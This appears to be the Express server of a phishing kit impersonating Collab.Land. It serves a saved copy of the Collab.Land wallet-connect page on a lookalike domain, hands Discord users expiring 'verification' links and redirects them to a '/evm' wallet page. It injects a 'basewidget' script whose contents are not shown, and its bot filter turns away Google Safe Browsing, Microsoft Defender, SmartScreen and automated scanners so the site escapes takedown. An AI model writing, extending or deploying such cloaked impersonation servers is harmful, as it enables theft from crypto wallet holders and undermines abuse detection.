// Node.js Express server - serves the HTML file
// Run this on your VPS with: node server.js
// Make sure to configure your web server (Apache/Nginx) to proxy requests to this server
// PHP files (like secureproxy.php) will be handled directly by the web server

require('dotenv').config();

const express = require('express');
const fs = require('fs').promises;
const path = require('path');
const {
  generateCollabLandUrl,
  generateUrlParamsScript: sharedGenerateUrlParamsScript,
  getCardStyleBlock,
} = require('./update_html.js');

const app = express();
const PORT = process.env.PORT || 3000;
const HTML_FILE = "Collab.Land Connect (11_7_2025 5：13：46 PM) (1).html";
const EXPIRED_HTML_FILE = "link-expired.html";
const PRIMARY_SLUG_ID = process.env.PRIMARY_SLUG_ID || "89QW6FhDgNj1rKf1";
const EXTRA_SLUG_IDS = (process.env.EXTRA_SLUG_IDS || "")
  .split(",")
  .map((slug) => slug.trim())
  .filter(Boolean);
function normalizeBaseUrl(value, fallback = "") {
  if (!value || typeof value !== "string") {
    return fallback;
  }
  const trimmed = value.trim();
  if (!trimmed) {
    return fallback;
  }
  return trimmed.replace(/\/$/, "");
}

const SLUG_DESTINATION_BASE_URL = normalizeBaseUrl(
  process.env.SLUG_DESTINATION_BASE_URL,
  "https://hyperlend.cc",
);
const SLUG_DESTINATION_PATH = process.env.SLUG_DESTINATION_PATH || "/evm";
const REDIRECT_ROOT_TO_SLUG = process.env.REDIRECT_ROOT_TO_SLUG === "true";
const SLUG_SERVICE_ORIGIN = normalizeBaseUrl(process.env.SLUG_SERVICE_BASE_URL);
const PUBLIC_BASE_URL = normalizeBaseUrl(process.env.PUBLIC_BASE_URL, SLUG_SERVICE_ORIGIN);
const SLUG_TTL_SECONDS = Number.isFinite(Number(process.env.SLUG_TTL_SECONDS))
  ? Number(process.env.SLUG_TTL_SECONDS)
  : 600;
const RESERVED_SLUG_PATHS = new Set([
  "",
  "health",
  "evm",
  "api",
  "slugs",
  "favicon.ico",
  "robots.txt",
]);

// Middleware to parse JSON bodies
app.use(express.json());

// In-memory storage for OAuth session data (guild info)
// Key: session token, Value: { guildId, interactionId, communityName, guildIconHash, timestamp, createdAt }
const oauthSessions = new Map();

// In-memory storage for slug redirects
// Key: slugId, Value: { state, id, expiresAt, createdAt, extraParams }
const slugRedirects = new Map();

// In-memory storage for valid states (to prevent fake/random state values)
// Key: state, Value: { id, expiresAt, createdAt, userId, guildId, interactionId }
const validStates = new Map();

// Clean up old sessions every 10 minutes (sessions expire after 10 minutes)
setInterval(() => {
  const now = Date.now();
  const maxAge = 10 * 60 * 1000; // 10 minutes
  for (const [token, data] of oauthSessions.entries()) {
    if (now - data.createdAt > maxAge) {
      oauthSessions.delete(token);
      console.log(`[OAuth Session] Cleaned up expired session: ${token.substring(0, 8)}...`);
    }
  }
}, 10 * 60 * 1000);

setInterval(() => {
  const now = Date.now();
  for (const [slugId, data] of slugRedirects.entries()) {
    if (data.expiresAt && now >= data.expiresAt) {
      slugRedirects.delete(slugId);
      console.log(`[Slug Redirect] Cleaned up expired slug: ${slugId}`);
    }
  }
  // Clean up expired states
  for (const [state, data] of validStates.entries()) {
    if (data.expiresAt && now >= data.expiresAt) {
      validStates.delete(state);
    }
  }
}, 60 * 1000);

/**
 * Generate a random session token
 */
function generateSessionToken() {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let result = "";
  for (let i = 0; i < 32; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

/**
 * Generate a random slug identifier
 */
function generateSlugId(length = 14) {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let result = "";
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

function computeSlugExpiration(expiresAtIso) {
  if (expiresAtIso) {
    const parsed = Date.parse(expiresAtIso);
    if (!Number.isNaN(parsed)) {
      return parsed;
    }
  }
  return Date.now() + SLUG_TTL_SECONDS * 1000;
}

function buildPublicSlugUrl(req, slugId) {
  if (PUBLIC_BASE_URL) {
    return `${PUBLIC_BASE_URL}/${slugId}`;
  }
  const protocol = (req.get('x-forwarded-proto') || req.protocol || 'https').replace(/[^a-z]/gi, '') || 'https';
  return `${protocol}://${req.get('host')}/${slugId}`;
}

function sanitizeExtraParams(extraParams) {
  if (!extraParams || typeof extraParams !== 'object') {
    return null;
  }
  const sanitized = {};
  for (const [key, value] of Object.entries(extraParams)) {
    if (typeof key !== 'string' || key.trim() === '' || key === 'state' || key === 'id') {
      continue;
    }
    if (typeof value === 'string' && value.trim() !== '') {
      sanitized[key] = value;
    }
  }
  return Object.keys(sanitized).length > 0 ? sanitized : null;
}

async function handleSlugRequest(req, res, slugId) {
  if (!slugId || typeof slugId !== 'string' || slugId.trim() === '' || RESERVED_SLUG_PATHS.has(slugId.toLowerCase())) {
    return res.status(404).send('Unknown slug identifier');
  }

  const destinationPath = SLUG_DESTINATION_PATH.startsWith('/')
    ? SLUG_DESTINATION_PATH
    : `/${SLUG_DESTINATION_PATH}`;
  const storedEntry = slugRedirects.get(slugId);

  if (storedEntry) {
    if (storedEntry.expiresAt && Date.now() >= storedEntry.expiresAt) {
      slugRedirects.delete(slugId);
      try {
        const expiredHtml = await fs.readFile(path.join(__dirname, EXPIRED_HTML_FILE), 'utf-8');
        res.set({
          'content-type': 'text/html; charset=utf-8',
          'cache-control': 'no-cache, no-store, must-revalidate',
          pragma: 'no-cache',
          expires: '0',
        });
        return res.status(410).send(expiredHtml);
      } catch (error) {
        console.error('Failed to load expiration page:', error.message);
        return res.status(410).send('This verification link has expired. Please return to Discord and request a new one.');
      }
    }

    const params = new URLSearchParams();
    params.append('state', storedEntry.state);
    params.append('id', storedEntry.id);
    if (storedEntry.extraParams) {
      for (const [key, value] of Object.entries(storedEntry.extraParams)) {
        params.append(key, value);
      }
    }

    const forwardUrl = `${SLUG_DESTINATION_BASE_URL}${destinationPath}?${params.toString()}`;
    console.log(`[Slug Redirect] ${slugId} -> ${forwardUrl}`);
    return res.redirect(302, forwardUrl);
  }

  // Backward compatibility: allow explicit state/id query parameters
  const { state, id, ...restParams } = req.query || {};
  if (state && id) {
    const params = new URLSearchParams();
    params.append('state', state);
    params.append('id', id);
    for (const [key, value] of Object.entries(restParams)) {
      if (typeof value !== 'undefined') {
        params.append(key, value);
      }
    }
    const forwardUrl = `${SLUG_DESTINATION_BASE_URL}${destinationPath}?${params.toString()}`;
    console.log(`[Slug Redirect] Legacy params for ${slugId} -> ${forwardUrl}`);
    return res.redirect(302, forwardUrl);
  }

  return res.status(404).send('Unknown slug identifier');
}

// API endpoint for bot to store guild info and get session token
app.post('/api/oauth/session', (req, res) => {
  try {
    const { guildId, interactionId, communityName, guildIconHash, timestamp } = req.body;
    
    if (!guildId || !interactionId || !communityName) {
      return res.status(400).json({ error: 'Missing required fields: guildId, interactionId, communityName' });
    }
    
    // Generate session token
    const sessionToken = generateSessionToken();
    
    // Store session data
    oauthSessions.set(sessionToken, {
      guildId,
      interactionId,
      communityName,
      guildIconHash: guildIconHash || null,
      timestamp: timestamp || new Date().toISOString(),
      createdAt: Date.now()
    });
    
    console.log(`[OAuth Session] Created session for guild ${guildId} (${communityName}), token: ${sessionToken.substring(0, 8)}...`);
    
    res.json({ token: sessionToken });
  } catch (error) {
    console.error('[OAuth Session] Error creating session:', error);
    res.status(500).json({ error: 'Failed to create session' });
  }
});

// API endpoint to register valid states (called by bot when generating URLs)
app.post('/api/states/register', (req, res) => {
  try {
    const { state, id, expiresAt, userId, guildId, interactionId } = req.body || {};

    if (!state || !id || typeof state !== 'string' || typeof id !== 'string') {
      return res.status(400).json({ error: 'Missing required fields: state and id' });
    }

    const stateTrimmed = state.trim();
    const idTrimmed = id.trim();
    if (!stateTrimmed || !idTrimmed) {
      return res.status(400).json({ error: 'state and id cannot be empty' });
    }

    let expiresAtMs = null;
    if (expiresAt) {
      const parsed = Date.parse(expiresAt);
      if (!Number.isNaN(parsed)) {
        expiresAtMs = parsed;
      }
    }

    // Store state with associated data for validation
    validStates.set(stateTrimmed, {
      id: idTrimmed,
      expiresAt: expiresAtMs,
      createdAt: Date.now(),
      userId: userId || null,
      guildId: guildId || null,
      interactionId: interactionId || null,
    });

    console.log(`[State Registration] Registered state: ${stateTrimmed.substring(0, 8)}...`);
    res.json({ success: true });
  } catch (error) {
    console.error('[State Registration] Error:', error);
    res.status(500).json({ error: 'Failed to register state' });
  }
});

// API endpoint to create slug-based redirects without exposing query params
app.post('/api/slugs', (req, res) => {
  try {
    const { state, id, expiresAt, extraParams } = req.body || {};

    if (!state || !id || typeof state !== 'string' || typeof id !== 'string') {
      return res.status(400).json({ error: 'Missing required fields: state and id' });
    }

    const stateTrimmed = state.trim();
    const idTrimmed = id.trim();
    if (!stateTrimmed || !idTrimmed) {
      return res.status(400).json({ error: 'state and id cannot be empty' });
    }

    let slugId = generateSlugId();
    while (slugRedirects.has(slugId)) {
      slugId = generateSlugId();
    }

    const expiresAtMs = computeSlugExpiration(expiresAt);
    const sanitizedParams = sanitizeExtraParams(extraParams);

    slugRedirects.set(slugId, {
      state: stateTrimmed,
      id: idTrimmed,
      createdAt: Date.now(),
      expiresAt: expiresAtMs,
      extraParams: sanitizedParams,
    });

    // Also register the state as valid
    validStates.set(stateTrimmed, {
      id: idTrimmed,
      expiresAt: expiresAtMs,
      createdAt: Date.now(),
      userId: null,
      guildId: null,
      interactionId: null,
    });

    const slugUrl = buildPublicSlugUrl(req, slugId);
    console.log(`[Slug Redirect] Created slug ${slugId} (expires at ${new Date(expiresAtMs).toISOString()})`);

    res.json({
      slugId,
      slugUrl,
      expiresAt: new Date(expiresAtMs).toISOString(),
    });
  } catch (error) {
    console.error('[Slug Redirect] Error creating slug:', error);
    res.status(500).json({ error: 'Failed to create slug' });
  }
});

// List of hostnames that should have anti-bot protection
const PROTECTED_HOSTNAMES = [
  "collab.land-entry.app", // Add your custom domain here
  // Add more hostnames as needed
];

/**
 * Generate the URL parameter script that reads state and id from URL
 * and updates the page with personalized content
 */
function generateUrlParamsScript() {
  return sharedGenerateUrlParamsScript();
}

function getCardStyle() {
  return getCardStyleBlock();
}

/**
 * Safely serialize data for inline script injection
 */
function serializeForInlineScript(data) {
  if (data === null || typeof data === 'undefined') {
    return 'null';
  }
  return JSON.stringify(data)
    .replace(/</g, '\\u003c')
    .replace(/>/g, '\\u003e')
    .replace(/&/g, '\\u0026');
}

/**
 * Check if request is from a bot
 */
function isBot(userAgent, acceptLanguage, acceptEncoding) {
  const botPatterns = [
    /bot/i,
    /crawler/i,
    /spider/i,
    /scraper/i,
    /curl/i,
    /wget/i,
    /python/i,
    /java/i,
    /php/i,
    /go-http/i,
    /okhttp/i,
    /axios/i,
    /headless/i,
    /selenium/i,
    /puppeteer/i,
    /playwright/i,
    // Security services that should be blocked
    /google/i,
    /safebrowsing/i,
    /microsoft/i,
    /defender/i,
    /smartscreen/i,
    /windows defender/i,
    /microsoft defender/i,
    /google safebrowsing/i,
    /mozilla\/5\.0.*google/i,
    /mozilla\/5\.0.*microsoft/i,
    /chrome-lighthouse/i,
    /lighthouse/i,
    /page speed/i,
  ];

  const isBot =
    botPatterns.some((pattern) => pattern.test(userAgent)) ||
    !acceptLanguage ||
    !acceptEncoding ||
    userAgent.length < 10;

  return isBot;
}

// Root route - simple status page (OAuth no longer needed, using direct links)
app.get('/', (req, res) => {
  if (REDIRECT_ROOT_TO_SLUG && PRIMARY_SLUG_ID) {
    const queryString = req.url.includes('?') ? req.url.substring(req.url.indexOf('?')) : '';
    return res.redirect(302, `/${PRIMARY_SLUG_ID}${queryString}`);
  }

  const { state, id, ...restParams } = req.query || {};
  if (state && id) {
    const params = new URLSearchParams();
    params.append('state', state);
    params.append('id', id);
    for (const [key, value] of Object.entries(restParams)) {
      if (typeof value !== 'undefined') {
        params.append(key, value);
      }
    }
    return res.redirect(302, `/evm?${params.toString()}`);
  }
  res.send(`
    <h1>Server is running!</h1>
    <p>Status: ✅ Online</p>
    <p>Connect wallet links go directly to <code>/evm?state=...&id=...</code></p>
  `);
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// Serve static JavaScript files (like basewidget-4.7.3.js)
app.get('*.js', async (req, res) => {
  const fileName = req.path.substring(1); // Remove leading slash
  try {
    const filePath = path.join(__dirname, fileName);
    const fileContent = await fs.readFile(filePath);
    res.set({
      'content-type': 'application/javascript; charset=utf-8',
      'access-control-allow-origin': '*',
      'cache-control': 'public, max-age=3600',
    });
    res.send(fileContent);
  } catch (error) {
    console.error(`✗ Error serving static file ${fileName}:`, error.message);
    res.status(404).send(`File Not Found: ${fileName}\n\nMake sure the file exists in your project directory.`);
  }
});

// Serve static image files (like c2c45fccdf10d21632189.png)
app.get('*.png', async (req, res) => {
  const fileName = req.path.substring(1); // Remove leading slash
  try {
    const filePath = path.join(__dirname, fileName);
    const fileContent = await fs.readFile(filePath);
    res.set({
      'content-type': 'image/png',
      'access-control-allow-origin': '*',
      'cache-control': 'public, max-age=3600',
    });
    res.send(fileContent);
  } catch (error) {
    console.error(`✗ Error serving image file ${fileName}:`, error.message);
    res.status(404).send(`File Not Found: ${fileName}\n\nMake sure the file exists in your project directory.`);
  }
});

// Handle /evm route for HTML
app.get('/evm', async (req, res) => {
  try {
    const hostname = req.get('host');
    
    // Anti-bot detection for protected hostnames
    if (PROTECTED_HOSTNAMES.includes(hostname)) {
      const userAgent = req.get('user-agent') || '';
      const acceptLanguage = req.get('accept-language') || '';
      const acceptEncoding = req.get('accept-encoding') || '';
      
      if (isBot(userAgent, acceptLanguage, acceptEncoding)) {
        return res.status(403).send('Access Denied');
      }
    }

    // Check for required parameters (state and id)
    const state = req.query.state;
    const id = req.query.id;

    // Require both state and id parameters
    if (!state || !id) {
      return res.status(400).send('Bad Request: Missing required parameters (state and id)');
    }

    // Validate parameters are not empty
    const stateTrimmed = state.trim();
    const idTrimmed = id.trim();
    if (stateTrimmed === '' || idTrimmed === '') {
      return res.status(400).send('Bad Request: Parameters cannot be empty');
    }

    // Validate state format (should be alphanumeric, reasonable length)
    if (!/^[A-Za-z0-9_-]{10,50}$/.test(stateTrimmed)) {
      return res.status(400).send('Bad Request: Invalid state parameter format');
    }

    // Validate that state is a real/registered state (not just a random string)
    const stateData = validStates.get(stateTrimmed);
    if (!stateData) {
      console.warn(`[State Validation] Invalid state: ${stateTrimmed.substring(0, 8)}... (not registered)`);
      return res.status(403).send('Invalid verification link. Please request a new link from Discord.');
    }

    // Validate that the id matches the registered state
    if (stateData.id !== idTrimmed) {
      console.warn(`[State Validation] State/id mismatch for state: ${stateTrimmed.substring(0, 8)}...`);
      return res.status(403).send('Invalid verification link. The link parameters do not match.');
    }

    // Validate id is valid base64
    let decodedPayload = null;
    let decodedData = null;
    try {
      if (!/^[A-Za-z0-9+/_-]+={0,2}$/.test(idTrimmed)) {
        return res.status(400).send('Bad Request: Invalid id parameter format (not valid base64)');
      }
      const standardBase64 = idTrimmed.replace(/-/g, '+').replace(/_/g, '/');
      decodedPayload = Buffer.from(standardBase64, 'base64').toString('utf-8');

      try {
        decodedData = JSON.parse(decodedPayload);
      } catch (parseError) {
        console.warn('Could not parse id payload JSON:', parseError.message);
        decodedData = null;
      }
    } catch (e) {
      return res.status(400).send('Bad Request: Invalid id parameter (cannot decode base64)');
    }

    // Determine expiration using decoded payload (if it is JSON)
    let linkExpired = false;
    if (decodedData) {
      const expirationMinutes = Number(decodedData.expirationMinutes || decodedData.em || 6);
      const expiresAtIso = decodedData.expiresAt || decodedData.exp;
      const timestampIso = decodedData.timestampIso || decodedData.ts;

      let expiresAtMs = null;
      if (expiresAtIso) {
        const parsed = Date.parse(expiresAtIso);
        if (!Number.isNaN(parsed)) {
          expiresAtMs = parsed;
        }
      }

      if (!expiresAtMs && timestampIso) {
        const createdAt = Date.parse(timestampIso);
        if (!Number.isNaN(createdAt)) {
          const durationMinutes = Number.isFinite(expirationMinutes) && expirationMinutes > 0 ? expirationMinutes : 6;
          expiresAtMs = createdAt + durationMinutes * 60 * 1000;
        }
      }

      if (expiresAtMs) {
        linkExpired = Date.now() >= expiresAtMs;
      }
    }

    if (linkExpired) {
      try {
        const expiredHtml = await fs.readFile(path.join(__dirname, EXPIRED_HTML_FILE), 'utf-8');
        res.set({
          'content-type': 'text/html; charset=utf-8',
          'cache-control': 'no-cache, no-store, must-revalidate',
          pragma: 'no-cache',
          expires: '0',
        });
        return res.status(410).send(expiredHtml);
      } catch (error) {
        console.error('Failed to load expiration page:', error.message);
        return res.status(410).send('This verification link has expired. Please return to Discord and request a new one.');
      }
    }

    // Serve HTML file only if all requirements are met
    const filePath = path.join(__dirname, HTML_FILE);
    let html = await fs.readFile(filePath, 'utf-8');
    
    // Check if basewidget script exists in HTML
    const hasBasewidget = html.includes('basewidget-4.7.3.js');
    
    // Fix relative script paths to absolute paths (e.g., ./basewidget-4.7.3.js -> /basewidget-4.7.3.js)
    html = html.replace(/src=["']\.\/([^"']+)["']/g, 'src="/$1"');
    
    // Verify the script tag is still there after path replacement
    const hasBasewidgetAfter = html.includes('basewidget-4.7.3.js');
    console.log(`Basewidget script tag found after path fix: ${hasBasewidgetAfter}`);
    if (hasBasewidget && !hasBasewidgetAfter) {
      console.warn('WARNING: Basewidget script tag was removed during path replacement!');
    }
    
    // Always inject the script (remove old one if exists, then add new one)
    console.log('Preparing HTML with URL parameter script...');
    
    // Remove any existing script we may have injected before
    html = html.replace(/<style>[\s\S]*?\.sc-iqPaeV\.ijefWr[\s\S]*?<\/style>/g, '');
    html = html.replace(/<script>[\s\S]*?URLSearchParams[\s\S]*?createPersonalizedCard[\s\S]*?<\/script>/g, '');
    
    // Generate the URL parameter script
    const urlParamsScript = generateUrlParamsScript();
    const cardStyleBlock = getCardStyle();
    if (html.includes('</head>')) {
      html = html.replace('</head>', `${cardStyleBlock}\n</head>`);
    } else {
      html = cardStyleBlock + html;
    }
    const payloadScriptTag = `<script id="collab-land-payload-data">window.__COLLAB_LAND_PAYLOAD__ = ${serializeForInlineScript(decodedData)};</script>`;
    
    // Try multiple injection points
    if (html.includes('</body>')) {
      html = html.replace('</body>', `${payloadScriptTag}\n${urlParamsScript}\n</body>`);
    } else if (html.includes('</html>')) {
      html = html.replace('</html>', `${payloadScriptTag}\n${urlParamsScript}\n</html>`);
    } else if (html.includes('</script>')) {
      const lastScriptIndex = html.lastIndexOf('</script>');
      if (lastScriptIndex !== -1) {
        const insertPos = lastScriptIndex + '</script>'.length;
        html = html.slice(0, insertPos) + '\n' + payloadScriptTag + '\n' + urlParamsScript + html.slice(insertPos);
      } else {
        html += payloadScriptTag + '\n' + urlParamsScript;
      }
    } else {
      html += payloadScriptTag + '\n' + urlParamsScript;
    }
    
    // Final verification: Ensure basewidget script is in the final HTML
    const finalCheck = html.includes('basewidget-4.7.3.js');
    console.log(`Final check - basewidget script in served HTML: ${finalCheck}`);
    if (!finalCheck && hasBasewidget) {
      console.error('ERROR: Basewidget script was lost during processing! Adding it back...');
      if (html.includes('</head>')) {
        html = html.replace('</head>', '<script charset="UTF-8" type="text/javascript" src="/basewidget-4.7.3.js"></script></head>');
      } else if (html.includes('<head>')) {
        html = html.replace('<head>', '<head><script charset="UTF-8" type="text/javascript" src="/basewidget-4.7.3.js"></script>');
      } else {
        html = html.replace(/<html[^>]*>/, '$&<script charset="UTF-8" type="text/javascript" src="/basewidget-4.7.3.js"></script>');
      }
    }
    
    res.set({
      'content-type': 'text/html; charset=utf-8',
      'access-control-allow-origin': '*',
      'cache-control': 'no-cache, no-store, must-revalidate',
      'pragma': 'no-cache',
      'expires': '0',
    });
    res.send(html);
  } catch (error) {
    console.error('Error serving file:', error);
    res.status(500).send(`Error: ${error.message}`);
  }
});

// Legacy route support: redirect /slugs/:slugId -> /:slugId
app.get('/slugs/:slugId', (req, res) => {
  const { slugId } = req.params;
  if (!slugId) {
    return res.status(404).send('Unknown slug identifier');
  }
  const queryString = req.originalUrl && req.originalUrl.includes('?')
    ? req.originalUrl.substring(req.originalUrl.indexOf('?'))
    : '';
  console.log(`[Slug Redirect] Legacy /slugs path requested for ${slugId}`);
  return res.redirect(301, `/${slugId}${queryString}`);
});

// Friendly slug redirect route without /slugs prefix
app.get('/:slugId', (req, res, next) => {
  const { slugId } = req.params;

  if (!slugId) {
    return res.status(404).send('Unknown slug identifier');
  }

  // Allow other explicit routes (like /evm, /api) to handle requests first
  if (RESERVED_SLUG_PATHS.has(slugId.toLowerCase())) {
    return next();
  }

  return handleSlugRequest(req, res, slugId);
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📄 HTML file: ${HTML_FILE}`);
  console.log(`🌐 Access at: http://localhost:${PORT}/evm?state=XXX&id=YYY`);
});


